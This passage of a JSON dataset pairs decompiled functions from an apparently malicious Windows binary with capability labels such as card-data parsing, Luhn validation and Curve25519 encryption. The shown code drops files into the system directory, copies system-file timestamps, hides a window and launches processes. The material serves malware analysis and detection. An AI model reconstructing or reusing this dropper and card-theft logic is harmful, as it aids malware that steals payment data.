(!bVar13)) {\n        param_2 = *(iVar2 + 0x3c);\n        if (0xbf < param_2) goto code_r0x00404062;\n    }\n    else {\n        puVar9 = *0x8b17b43a;\n        param_2 = param_2 + 1;\n        *param_2 = *param_2;\n        unaff_EBX[3] = unaff_EBX[3] + (iVar2 >> 8);\n    }\n    piVar10 = param_2 + -0x40;\ncode_r0x00404062:\n    puVar5 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    if (puVar5 == NULL) {\n        return 0;\n    }\n    bVar13 = false;\n    bVar14 = piVar10 == NULL;\n    puVar7 = puVar5;\n    piVar11 = NULL;\n    if (!bVar14) {\n        do {\n            if ((bVar13 || bVar14) || (!bVar13 && !bVar14)) {\n                pcVar6 = (*_sym.imp.MSVCRT.dll_rand)();\n            }\n            else {\n                puVar1 = piVar11 + -1;\n                puVar3 = *puVar1;\n                *puVar1 = *puVar1 - &stack0xfffffff4;\n                pcVar6 = puVar7 + sym.imp.MSVCRT.dll_rand + (puVar3 < &stack0xfffffff4);\n            }\n            puVar7 = pcVar6 / 0xff;\n            piVar12 = piVar11 + 1;\n            bVar13 = piVar12 < piVar10;\n            bVar14 = piVar12 == piVar10;\n            *(piVar11 + puVar5) = pcVar6 % 0xff;\n            piVar11 = piVar12;\n        } while (bVar13);\n    }\n    puVar7 = *(puVar9 + 8) + 0x80;\n    for (uVar8 = piVar10 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n        *puVar7 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (uVar8 = piVar10 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {\n        *puVar7 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    func_0x00404fd0();\n    return 1;\n}\n",
        "token_count": 1315
    },
    "00401890": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004019a1) overlaps instruction at (ram,0x0040199f)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401890(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint *puVar5;\n    bool bVar6;\n    uchar lpszPath;\n    uint var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    bVar6 = in_EAX + 1 < 0;\n    iVar3 = fcn.00403090();\n    if ((bVar6) || (!bVar6)) {\n        iVar3 = fcn.00401070();\n        if (iVar3 == 0) {\n            return;\n        }\n    }\n    else {\n        piVar4 = iVar3 + -0x84a18;\n        *piVar4 = *piVar4 + piVar4;\n        *(unaff_ESI + 10) = *(unaff_ESI + 10) + (unaff_EBX >> 8);\n    }\n    lpszPath = 0;\n    puVar5 = &var_25fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    iVar3 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n    if (iVar3 != 0) {\n        fcn.00402520();\n        s = 0;\n        puVar5 = &var_15bh;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = 0;\n        *(puVar5 + 2) = 0;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4073b0, &lpszPath, 0x407390, 3);\n        pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n        var_14h = 0;\n        do {\n            puVar5 = &var_58h;\n            for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            var_28h._0_2_ = 0;\n            hProcess = 0;\n            var_ch = 0;\n            var_58h = 0x44;\n            lParam = 0;\n            var_2ch = 1;\n            var_4h = 0;\n            iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                              (0, &s, &var_58h, &var_58h, &var_58h, &var_58h, &var_58h, &var_58h, 0, &stack0xfffffffc);\n            if (iVar3 == 0) {\n                return;\n            }\n            (*pcVar2)(3000);\n            (*_sym.imp.USER32.dll_EnumWindows)(fcn.00401780, lParam);\n            iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n            if (iVar3 == 0x102) {\n                (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n            }\n            pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n            (*pcVar1)(hProcess);\n            var_14h = var_14h + 1;\n        } while (var_14h < 1);\n    }\n    return;\n}\n",
        "token_count": 974
    },
    "00401d90": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401d90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407010, 0x423748, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00401ff0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00401ff0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 187
    },
    "00401bf0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401bf0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)();\n    if (iVar1 != 0) {\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems);\n        (*_sym.imp.MSVCRT.dll_fflush)();\n        (*_sym.imp.MSVCRT.dll_fclose)();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "004036d0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403701) overlaps instruction at (ram,0x00403700)\n// \n\nuint __cdecl fcn.004036d0(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char *pcVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uint32_t unaff_EBX;\n    bool bVar4;\n    uint8_t in_AF;\n    ulong uVar5;\n    uint uStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_4h;\n    \n    bVar4 = 0xcf < unaff_EBX >> 8;\n    uVar5 = fcn.004022e0();\n    *0x423778 = uVar5;\n    if ((!bVar4) && (bVar4)) {\n        unaff_EBX = unaff_EBX + *(unaff_EBX + 0x69 + (uVar5 >> 0x20) * 4) + bVar4;\n    }\n    uStack24 = 0x80;\n    uStack28 = 2;\n    uStack44 = arg_8h;\n    while( true ) {\n        uStack32 = 0;\n        uStack36 = 1;\n        uStack40 = 0x40000000;\n        uStack48 = 0x403720;\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n        if (arg_8h_00 == -1) {\n            return 0;\n        }\n        if ((arg_8h_00 == -1) && (arg_8h_00 != -1)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uStack48 = 0;\n        uVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch);\n        uVar2 = uVar5;\n        if (uVar2 == 0) {\n            return 0;\n        }\n        if ((uVar2 < 1) || (0 < uVar2)) break;\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        uVar2 = uVar2 & 0xffff0000 | CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        pcVar1 = (uVar5 >> 0x20) + 2;\n        *pcVar1 = *pcVar1 + (*(uVar2 + 0x6a0845) * 0x8068 >> 8);\n        uStack44 = unaff_EBX;\n        unaff_EBX = uVar2;\n    }\n    if (*0x423778 != 0) {\n        iVar3 = fcn.00403600(arg_8h_00);\n        *0x423778 = iVar3 == 0;\n    }\n    fcn.004038d0(0, arg_8h_00);\n    if (((-1 < &stack0xffffffd0) && (-1 >= &stack0xffffffd0)) || (*0x423778 == 0)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    return 1;\n}\n",
        "token_count": 823
    },
    "00403e50": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403e50(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &s + 1;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407028, &lpBuffer, arg_8h);\n    fcn.00404ce0(&var_4h, &var_8h);\n    fcn.00403f80(var_4h);\n    iVar1 = fcn.004036d0(&s, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.004038d0(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 406
    },
    "00401d00": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.00401d00(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar1 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h != 0) {\n        if (arg_8h <= pcVar1) {\n            do {\n                if (*arg_8h == *arg_10h) {\n                    bVar5 = true;\n                    iVar2 = arg_14h;\n                    pcVar3 = arg_8h;\n                    pcVar4 = arg_10h;\n                    do {\n                        pcVar4 = pcVar4 + 1;\n                        pcVar3 = pcVar3 + 1;\n                        iVar2 = iVar2 + -1;\n                        if (iVar2 == 0) break;\n                        bVar5 = *pcVar3 == *pcVar4;\n                    } while (bVar5);\n                    if (bVar5) {\n                        return arg_8h;\n                    }\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar1);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 326
    },
    "00403ac0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403ac0(uint *arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar3 = &var_67h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    bVar4 = false;\n    uVar1 = fcn.00403b50(&var_68h, &var_4h);\n    if ((!bVar4) && (bVar4)) {\n        out(0xbd, uVar1);\n        return;\n    }\n    fcn.004046b0(&var_68h, var_4h, 0x407494, 0xa2a0);\n    *arg_8h = 0x407494;\n    *arg_ch = 0xa2a0;\n    return;\n}\n",
        "token_count": 294
    },
    "00404130": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404281) overlaps instruction at (ram,0x0040427e)\n// \n// WARNING: Removing unreachable block (ram,0x00404278)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00404130(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    bool bVar5;\n    uchar lpBuffer;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar4 = &var_213h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    s = 0;\n    puVar4 = &var_10fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_ch = 1;\n    *(puVar4 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407034, &lpBuffer, arg_8h);\n    fcn.00403ac0(&var_4h, &var_8h);\n    iVar2 = fcn.00401df0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = fcn.004036d0(&s, var_4h, var_8h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    fcn.00402450();\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar2 = fcn.00404a50(0x40706c);\n    if (iVar2 == -1) {\n        iVar2 = fcn.00404a50(0x407060);\n        if (iVar2 == -1) goto code_r0x004042ff;\n        uVar3 = 0xf;\n    }\n    else {\n        uVar3 = 0xe;\n    }\n    iVar2 = fcn.00404f80(arg_8h);\n    if (iVar2 != 0) {\n        fcn.00403340(uVar3);\n        fcn.00401fe0(uVar3);\n        return 1;\n    }\n    if (*0x423778 == 0) {\n        return 0;\n    }\ncode_r0x004042ff:\n    iVar2 = fcn.00402650(arg_8h, &s);\n    if (iVar2 == 0) {\n        var_ch = 0;\n    }\n    iVar2 = var_ch;\n    bVar5 = var_ch < 0;\n    if (var_ch != 0) {\n        iVar1 = fcn.004037f0(arg_8h);\n        bVar5 = iVar1 < 0;\n        if (iVar1 == 0) {\n            var_ch = 0;\n            iVar2 = iVar1;\n        }\n    }\n    if (((!bVar5) && (bVar5)) || (iVar2 == 0)) {\n        iVar2 = fcn.00404730(arg_8h, iVar2);\n        var_ch = iVar2;\n    }\n    if (iVar2 != 0) {\n        fcn.00401fe0(0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x407080, 0);\n    return iVar2;\n}\n",
        "token_count": 959
    },
    "00404410": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004044c7) overlaps instruction at (ram,0x004044c2)\n// \n\nint32_t __cdecl fcn.00404410(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint16_t extraout_CX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    bool bVar6;\n    bool in_OF;\n    bool bVar7;\n    ulong uVar8;\n    \n    if ((!in_OF) && (in_OF)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar1 = fcn.004049a0(0, arg_8h, arg_ch + 1U >> 1);\n    uVar1 = uVar1 & 0xffff;\n    iVar2 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    uVar3 = *(iVar2 + 0x58);\n    if (uVar1 < uVar3) {\n        uVar4 = extraout_CX;\n        uVar1 = uVar1 - uVar3 & 0xffff;\n        bVar7 = SBORROW4(uVar1, 1);\n        iVar5 = uVar1 - 1;\n        bVar6 = iVar5 == 0;\n    }\n    else {\n        uVar4 = uVar3 & 0xffff;\n        bVar7 = SBORROW4(uVar1, uVar4);\n        iVar5 = uVar1 - uVar4;\n        bVar6 = uVar1 == uVar4;\n    }\n    if ((bVar6 || bVar7 != iVar5 < 0) || (!bVar6 && bVar7 == iVar5 < 0)) {\n        uVar3 = uVar3 >> 0x10;\n    }\n    bVar6 = false;\n    *(uVar3 + 0xc139da56) = *(uVar3 + 0xc139da56) ^ uVar4;\n    uVar8 = func_0xd07baadd();\n    iVar5 = uVar8 >> 0x20;\n    if (bVar6) {\n        iVar5 = (iVar5 - uVar8 & 0xffff) - 1;\n    }\n    else {\n        iVar5 = iVar5 - (uVar8 & 0xffff);\n    }\n    *arg_14h = iVar5 + arg_ch;\n    *arg_10h = *(iVar2 + 0x58);\n    return iVar2;\n}\n",
        "token_count": 603
    },
    "00401df0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004022e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.004022e0(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00401ff0(0x80000002, 0x4072f4, 0x407334, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 152
    },
    "00403300": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00403300(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401a70(0x407014);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "004038d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403968) overlaps instruction at (ram,0x00403966)\n// \n\nuint __cdecl fcn.004038d0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    bool bVar10;\n    float10 fVar11;\n    char lpBuffer;\n    uint var_22bh;\n    uint var_128h;\n    uint var_24h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    \n    lpBuffer = '\\0';\n    var_128h._0_1_ = 0;\n    puVar6 = &var_22bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    bVar10 = false;\n    puVar6 = &var_128h + 1;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    fVar11 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    if ((!bVar10) && (bVar10)) {\n        *(puVar6 + 0x1f) = fVar11;\n    }\n    uVar4 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar8 = pcVar7;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar8 = pcVar7 + 1;\n        cVar2 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar2 != '\\0');\n    uVar4 = ~uVar4;\n    puVar6 = pcVar8 + -uVar4;\n    puVar9 = &var_128h;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar9 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar4 = 0xffffffff;\n    cVar2 = &var_128h;\n    *(arg_ch + -0x3fcc0037) = *(arg_ch + -0x3fcc0037) + cVar2;\n    pcVar7 = 0x40704c;\n    do {\n        pcVar8 = pcVar7;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar2 != cVar1);\n    uVar4 = ~uVar4;\n    iVar3 = -1;\n    puVar6 = &var_128h;\n    do {\n        puVar9 = puVar6;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        puVar9 = puVar6 + 1;\n        cVar1 = *puVar6;\n        puVar6 = puVar9;\n    } while (cVar2 != cVar1);\n    puVar6 = pcVar8 + -uVar4;\n    puVar9 = puVar9 + -1;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar9 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_128h, 0, &var_24h);\n    iVar3 = arg_ch;\n    if ((arg_ch == -1) && (iVar3 = fcn.00401a70(arg_8h),  iVar3 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar3, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return 1;\n}\n",
        "token_count": 1259
    },
    "00403df0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403df0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 == -1) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 73
    },
    "00404540": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004045f0) overlaps instruction at (ram,0x004045ee)\n// \n// WARNING: Removing unreachable block (ram,0x00404575)\n// WARNING: Removing unreachable block (ram,0x004045f0)\n// WARNING: Removing unreachable block (ram,0x0040457a)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00404540(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.00401c70();\n    if (iVar1 == 0) {\n        return false;\n    }\n    fcn.00403a20();\n    iVar1 = fcn.00404a50(0x407078);\n    if (iVar1 != -1) {\n        return false;\n    }\n    fcn.00402cc0();\n    *0x42377c = 1;\n    iVar1 = fcn.00403300();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar2 = &var_1fh;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar2 = &var_80h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar2 = &var_60h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00404e20(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.00403e50(&var_20h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.00404130(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar1 != 0;\n}\n",
        "token_count": 775
    },
    "00404a50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404b19) overlaps instruction at (ram,0x00404b16)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404a50(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    uint var_130h;\n    uint var_12ch;\n    uint uStack300;\n    uint var_10ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0xffffffff;\n    iVar1 = (**0x42376c)();\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar3 = &var_12ch;\n    var_4h = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x423770)();\n    do {\n        if (iVar2 == 0) {\ncode_r0x00404b25:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_8h;\n        }\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h);\n        bVar4 = iVar1 == 0;\n        if (bVar4) {\n            if ((!bVar4) && (bVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            var_8h = uStack300;\n            iVar1 = var_4h;\n            goto code_r0x00404b25;\n        }\n        iVar2 = (**0x423774)(var_4h, &var_130h);\n        iVar1 = var_4h;\n    } while( true );\n}\n",
        "token_count": 471
    },
    "00402380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
